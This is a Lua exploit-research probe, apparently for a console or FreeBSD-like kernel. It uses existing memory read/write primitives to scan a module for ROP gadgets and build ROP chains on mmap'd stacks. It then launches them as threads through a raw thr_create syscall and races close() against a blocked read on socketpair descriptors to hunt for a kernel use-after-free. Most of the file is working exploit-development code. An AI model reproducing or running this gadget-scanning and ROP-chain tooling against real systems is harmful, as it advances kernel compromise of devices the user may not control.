-- CRASH_CLASS: HIGH
-- PROBE 938a: thread lifetime against descriptor lifetime
--
-- The loader serialises TCP connections, but thr_create children really run in
-- parallel (896a reached the parent's live aio ids from two children at once).
-- That is the one ingredient a descriptor race needs, and nobody has raced
-- close() against a syscall that is already blocked on the same file.
--
-- The child runs a straight-line chain: pop_rdi(fd) pop_rsi(buf) pop_rdx(len)
-- pop_rax(3 = read) -> fn -> pop_rdi(out) -> store(mov [rdi],rax) -> spin.
-- The parent then closes one end of the socketpair and reads the child's store
-- buffer afterwards. [B] closes the peer (nullsockpair -> EOF for the blocked
-- reader), [C] closes the descriptor the child is reading from.

print("=== PROBE 938a: CLOSE VS BLOCKED READ ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s rsi=%s rdx=%s store=%s",
    tostring(pop_rax),tostring(pop_rdi),tostring(pop_rsi),tostring(pop_rdx),tostring(store)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("missing gadget") return end

local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,RAX=0x078}
local function child_call(sys,a1,a2,a3,out)
    local block=mmap(STACK); local start=block+STACK-0x200
    local ch={pop_rdi,a1,pop_rsi,a2,pop_rdx,a3,pop_rax,sys,fn,pop_rdi,out,store,jmp_g}
    for i=1,#ch do wq(start+(i-1)*8,uint64(ch[i])) end
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sys))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or -999
end
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end

local function newpair()
    local sv=memory.alloc(8); zero(sv,8)
    local ok=pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
    if not ok then return nil end
    return rd(sv), rd(sv+4)
end

local out=memory.alloc(8); zero(out,8)
local t=child_call(20,0,0,0,out)
sleep_ms(30)
print(string.format("[A] control child getpid: tid=%d out=%s", t, tostring(rd(out))))

-- [B] close the peer while the child blocks in read on the other end
local a,b=newpair()
print(string.format("[B] pair fds=%s,%s", tostring(a), tostring(b)))
if a and b then
    local buf=memory.alloc(0x40); zero(buf,0x40)
    local outB=memory.alloc(8); zero(outB,8)
    local tb=child_call(3,a,buf,0x20,outB)
    sleep_ms(60)
    print("    child read pending, closing peer fd " .. tostring(b))
    pcall(function() mk(6)(uint64(b),0,0,0,0,0) end)
    sleep_ms(120)
    print(string.format("    tid=%d out=%s (0 = EOF, absent = still blocked)", tb, tostring(rd(outB))))
end

-- [C] close the descriptor the child is blocked on
local c,d=newpair()
print(string.format("[C] pair fds=%s,%s", tostring(c), tostring(d)))
if c and d then
    local buf=memory.alloc(0x40); zero(buf,0x40)
    local outC=memory.alloc(8); zero(outC,8)
    local tc=child_call(3,c,buf,0x20,outC)
    sleep_ms(60)
    print("    child read pending, closing its own fd " .. tostring(c))
    pcall(function() mk(6)(uint64(c),0,0,0,0,0) end)
    sleep_ms(120)
    print(string.format("    tid=%d out=%s (0xFFFFFFFF = EBADF, absent = still blocked)", tc, tostring(rd(outC))))
    pcall(function() mk(6)(uint64(d),0,0,0,0,0) end)
end

print("")
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("=== COMPLETE ===")
